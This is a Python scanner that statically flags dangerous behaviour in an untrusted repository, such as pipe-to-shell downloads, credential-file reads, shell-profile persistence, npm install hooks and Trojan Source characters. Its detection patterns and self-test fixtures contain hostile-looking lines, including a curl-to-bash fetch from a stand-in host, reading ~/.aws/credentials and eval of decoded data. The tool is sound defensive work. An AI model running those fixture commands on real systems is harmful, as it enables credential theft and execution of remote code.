"""sniff: flag what an untrusted repo (e.g. a take-home assignment) would do, BEFORE you run it.

Static and read-only: it never executes, imports, or installs anything from the target.
Run: python3 sniff.py <path>     Self-check: python3 sniff.py --test
Exit code 1 if any HIGH finding, so it can gate CI.
"""
import json
import os
import re
import sys
import tempfile

# (id, severity, why it matters, regex). Matched line by line against every text file.
# ponytail: regex heuristics only; add AST parsing when false positives get annoying.
RULES = [
    ("pipe-to-shell", "HIGH", "downloads and runs code in one step",
     r"(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b"),
    ("shell-profile", "HIGH", "edits shell startup files (persistence, PATH hijack)",
     r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b"),
    ("toolchain-shim", "HIGH", "touches pyenv/nvm/rbenv shims (the pyenv swap trick)",
     r"\.pyenv|/shims/|\.nvm/|\.rbenv|\.asdf/"),
    ("persistence", "HIGH", "installs something that survives reboot",
     r"LaunchAgents|LaunchDaemons|crontab\s|systemctl\s+enable"),
    ("credential-path", "HIGH", "reads secrets: SSH keys, cloud, kube, docker, keychain",
     r"\.ssh/|\.aws/credentials|\.kube/config|\.docker/config\.json|Keychains|\.netrc|\.npmrc"),
    ("decode-exec", "MEDIUM", "decodes hidden data (common obfuscation)",
     r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\("),
    ("dynamic-exec", "MEDIUM", "runs code built at runtime",
     r"\b(exec|eval)\s*\(\s*(compile|.*decode|.*decompress|.*join)"),
    ("long-blob", "MEDIUM", "long encoded blob hidden in source",
     r"[A-Za-z0-9+/]{300,}={0,2}"),
    ("hidden-unicode", "HIGH", "bidirectional control characters (Trojan Source)",
     "[\u202a-\u202e\u2066-\u2069]"),
]
COMPILED = [(i, s, w, re.compile(r)) for i, s, w, r in RULES]
NPM_HOOKS = {"preinstall", "install", "postinstall", "prepare", "prepublish"}
SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__"}
BINARY_MAGIC = {b"\x7fELF": "ELF", b"\xcf\xfa\xed\xfe": "Mach-O", b"\xca\xfe\xba\xbe": "Mach-O fat",
                b"MZ": "Windows PE"}
MAX_BYTES = 2_000_000


def scan_text(rel, text):
    out = []
    for n, line in enumerate(text.splitlines(), 1):
        for rid, sev, why, rx in COMPILED:
            if rx.search(line):
                out.append((sev, rid, f"{rel}:{n}", why))
    return out


def scan_file(root, path):
    rel = os.path.relpath(path, root)
    try:
        if os.path.getsize(path) > MAX_BYTES:
            return [("MEDIUM", "large-file", rel, "too big to scan; inspect by hand")]
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return []
    for magic, kind in BINARY_MAGIC.items():
        if data.startswith(magic):
            return [("HIGH", "binary", rel, f"prebuilt {kind} executable; you can't read what it does")]
    if b"\0" in data[:4096]:
        return []  # other binary (images, etc.)
    text = data.decode("utf-8", errors="ignore")
    out = scan_text(rel, text)
    name = os.path.basename(path)
    if name == "package.json":
        try:
            scripts = json.loads(text).get("scripts", {}) or {}
        except (ValueError, AttributeError):
            scripts = {}
        for hook in NPM_HOOKS & set(scripts):
            out.append(("HIGH", "npm-install-hook", rel, f"runs on npm install: {scripts[hook]!r}"))
    if name == "setup.py":
        out.append(("MEDIUM", "setup-py", rel, "arbitrary code runs on pip install"))
    return out


def scan(root):
    findings = []
    hooks = os.path.join(root, ".git", "hooks")
    if os.path.isdir(hooks):  # a shipped .git with live hooks runs on your next git command
        findings += [("HIGH", "git-hook", f".git/hooks/{h}", "runs automatically on git commands")
                     for h in os.listdir(hooks) if not h.endswith(".sample")]
    for dirpath, dirs, files in os.walk(root):
        found = SKIP_DIRS & set(dirs)
        if "node_modules" in found:
            findings.append(("MEDIUM", "vendored-deps", os.path.relpath(os.path.join(dirpath, "node_modules"), root),
                             "ships its own dependencies; not scanned"))
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        for f in files:
            p = os.path.join(dirpath, f)
            if not os.path.islink(p):
                findings += scan_file(root, p)
    return sorted(findings, key=lambda x: (x[0] != "HIGH", x[2]))


def main(root):
    findings = scan(root)
    for sev, rid, where, why in findings:
        print(f"{sev:6} {rid:17} {where}  - {why}")
    high = sum(f[0] == "HIGH" for f in findings)
    print(f"\n{len(findings)} findings, {high} HIGH. "
          + ("Don't run this outside a sandbox." if high else "Nothing obvious; still run it in a sandbox."))
    return 1 if high else 0


def test():
    with tempfile.TemporaryDirectory() as d:
        files = {
            "install.sh": "curl -fsSL https://x.example/i.sh | bash\necho ok >> ~/.zshrc\n",
            "fix_env.py": "import shutil\nshutil.copy('p', os.path.expanduser('~/.pyenv/shims/python'))\n",
            "steal.js": "fs.readFileSync(home + '/.aws/credentials')\neval(atob(payload))\n",
            "package.json": json.dumps({"scripts": {"postinstall": "node steal.js", "test": "jest"}}),
            "clean.py": "print('hello world')\n",
            "tool": "\x7fELF rest",
            "trojan.py": "access = 'user' # ‮ admin\n",
        }
        for name, body in files.items():
            with open(os.path.join(d, name), "w") as f:
                f.write(body)
        ids = {(f[1], f[2].split(":")[0]) for f in scan(d)}
        for expected in [("pipe-to-shell", "install.sh"), ("shell-profile", "install.sh"),
                         ("toolchain-shim", "fix_env.py"), ("credential-path", "steal.js"),
                         ("decode-exec", "steal.js"), ("npm-install-hook", "package.json"),
                         ("binary", "tool"), ("hidden-unicode", "trojan.py")]:
            assert expected in ids, (expected, ids)
        assert not any(where == "clean.py" for _, where in ids), ids
        assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
    print("ok")


if __name__ == "__main__":
    if "--test" in sys.argv:
        test()
    elif len(sys.argv) == 2:
        sys.exit(main(sys.argv[1]))
    else:
        sys.exit(__doc__)
